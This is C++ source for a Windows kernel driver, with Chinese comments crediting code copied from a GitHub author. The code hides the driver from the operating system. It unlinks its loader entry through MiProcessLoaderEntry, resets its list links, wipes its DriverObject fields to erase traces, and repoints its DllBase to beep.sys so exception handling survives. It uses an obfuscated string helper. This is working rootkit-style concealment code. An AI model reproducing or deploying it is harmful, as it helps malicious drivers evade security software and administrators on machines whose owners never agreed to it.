/*
时间：2025年8月22日 06:58:59
学（抄）习（袭）自：https://github.com/ZhuHuiBeiShaDiao
*/
#include <ntddk.h>
#include"strXOR.h"
#include "PEB.h"

extern  RTL_OSVERSIONINFOW SystemVersionInf;//系统版本信息
extern "C"  POBJECT_TYPE* IoDriverObjectType;
extern C_MiProcessLoaderEntry L_MiProcessLoaderEntry;



typedef struct _SYSTEM_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



__forceinline BOOLEAN SupportSEH(PDRIVER_OBJECT DriverObject)
{
	//因为驱动从链表上摘除之后就不再支持SEH了
	//驱动的SEH分发是根据从链表上获取驱动地址，判断异常的地址是否在该驱动中
	//因为链表上没了，就会出问题
	//学习（抄袭）到的方法是用别人的驱动对象改他链表上的地址

	PDRIVER_OBJECT BeepDriverObject = NULL;;
	PLDR_DATA_TABLE_ENTRY LdrEntry = NULL;




	PDRIVER_OBJECT TempObject = NULL;
	UNICODE_STRING u_DriverName;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	L_RtlInitUnicodeString(&u_DriverName, OBFUSCATE(L"\\Driver\\beep").decrypt());
	Status = L_ObReferenceObjectByName(&u_DriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &TempObject);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("[-] Failed to get driver object for %wZ! Status: 0x%X\n", &u_DriverName, Status));
		BeepDriverObject = NULL;
		return FALSE;
	}

	BeepDriverObject = TempObject;



	//修改了自己驱动的 LDR_DATA_TABLE_ENTRY 结构体，将其中的 DllBase(模块基地址) 指向了 beep.sys 的基地址。
	//这样一来，当本驱动内发生异常时，内核会误以为这个异常发生在 beep.sys 模块内。
	//MiProcessLoaderEntry这个函数内部会根据Ldr中的DllBase然后去RtlxRemoveInvertedFunctionTable表中找到对应的项
	//之后再移除他，根据测试来讲..这个表中没有的DllBase就没法接收SEH，具体原理还没懂...
	//所以这里用系统的Driver\\beep用来替死...
	LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	LdrEntry->DllBase = BeepDriverObject->DriverStart;
	ObDereferenceObject(BeepDriverObject);
	return TRUE;
}

__forceinline VOID InitInLoadOrderLinks(PLDR_DATA_TABLE_ENTRY LdrEntry)
{
	// 手动空环链表，替代 InitializeListHead 宏/函数
	// 初始化 InLoadOrderLinks 链表
	LdrEntry->InLoadOrderLinks.Flink = &LdrEntry->InLoadOrderLinks;
	LdrEntry->InLoadOrderLinks.Blink = &LdrEntry->InLoadOrderLinks;

	// 初始化 InMemoryOrderLinks 链表
	LdrEntry->InMemoryOrderLinks.Flink = &LdrEntry->InMemoryOrderLinks;
	LdrEntry->InMemoryOrderLinks.Blink = &LdrEntry->InMemoryOrderLinks;

	// 初始化 InInitializationOrderLinks 链表
	LdrEntry->InInitializationOrderLinks.Flink = &LdrEntry->InInitializationOrderLinks;
	LdrEntry->InInitializationOrderLinks.Blink = &LdrEntry->InInitializationOrderLinks;
}



VOID Reinitialize(PDRIVER_OBJECT DriverObject, PVOID Context, ULONG Count)
{
	UNREFERENCED_PARAMETER(Context);
	UNREFERENCED_PARAMETER(Count);

	//  获取 MiProcessLoaderEntry 函数地址
	if (L_MiProcessLoaderEntry == NULL)return;

	// 修复SEH
	//if (!SupportSEH(DriverObject))
	//{
	//	// 即使SEH修复失败仍然继续隐藏驱动
	//	KdPrint(("[!] Warning: Failed to fix SEH handler. The driver will be hidden, but any exception may cause a crash.\n"));
	//}

	// 调用函数，把自己从链表中摘除,Dbg编译模式下会概率蓝屏不知道为什么
	L_MiProcessLoaderEntry(DriverObject->DriverSection, 0);// 参数 bLoad 为 0 代表卸载/移除


	//清理自己的链表指针
	InitInLoadOrderLinks((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);


	///抹除驱动对象中的痕迹
	DriverObject->DriverSection = NULL;
	DriverObject->DriverStart = NULL;
	DriverObject->DriverSize = NULL;
	DriverObject->DriverUnload = NULL;
	DriverObject->DriverInit = NULL;
	DriverObject->DeviceObject = NULL;
	DriverObject = NULL;
}
